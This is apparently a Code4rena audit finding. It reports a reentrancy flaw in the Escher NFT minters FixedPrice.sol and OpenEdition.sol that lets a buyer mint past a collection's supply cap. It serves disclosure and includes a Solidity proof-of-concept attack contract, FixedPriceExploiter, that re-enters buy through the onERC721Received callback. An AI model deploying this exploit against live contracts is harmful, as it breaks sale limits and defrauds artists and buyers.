https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/FixedPrice.sol#L57-L74
https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/OpenEdition.sol#L57-L72


# Vulnerability details

## Impact

offending code: https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/FixedPrice.sol#L57-L74

offending code: https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/OpenEdition.sol#L57-L72

Exploit appears in FixedPrice.sol and OpenEdition.sol; for the example we will focus on FixedPrice.sol.

function "buy" on line #57 of FixedPrice.sol is vulnerable to re-entrancy attack via way of the underlying _checkOnERC721Received callback contained within the _mint function imported via the IEscher721.sol import of the open zeppelin ERC721 library. 

The require statements on #62/63 have been implemented to ensure the total number of tokens minted does not exceed that of the value initialised in the contract at deployment via the state 'Sale" struct, however the user is able to mint the subsequent token before this value is updated (nft.mint called on L#66, with sale.currentId updating to the newid on L#69). 

As the underlying _mint function is calling the function "_checkOnERC721Received", it allows a malicious actor to deploy a contract that takes advantage of this callback enabling the attacker to mint an amount of tokens that exceed the maximum by way of implementing the callback function  "onERC721Received" prior to sale.currentId updating. 

This would ultimately lead to a loss of faith in the protocol, as artists and creators cannot trust the protocol to enforce collection limitations and render the deployments relatively useless.

## Proof of Concept

A sample attack contract may look like this:

```solidity 

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IFixedPrice {
    function buy(uint256 _amount) external payable;

    function getPrice() external view returns (uint256);
}

contract FixedPriceExploiter is IERC721Receiver, Ownable {
    IFixedPrice fixedPriceTarget;
    uint256 price;
    uint256 exploitAmount;
    uint256 exploitTotalValue;
    bool trigger;
    bool finished;

    constructor(address _fixedPriceContract, uint amountToPurchase) {
        fixedPriceTarget = IFixedPrice(_fixedPriceContract);
        price = fixedPriceTarget.getPrice();
        exploitAmount = amountToPurchase;
        exploitTotalValue = exploitAmount * price;
    }

    function initialBuy() public payable onlyOwner {
        trigger = true;
        fixedPriceTarget.buy{value: price}(1);
    }

    function exploit() public payable {
        require(trigger);
        require(!finished);
        fixedPriceTarget.buy{value: exploitTotalValue}(exploitAmount);
        finished = true;
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {
        exploit();
    }

    // func fundContract

    // func withdrawERC721toOnlyOwner
}

```

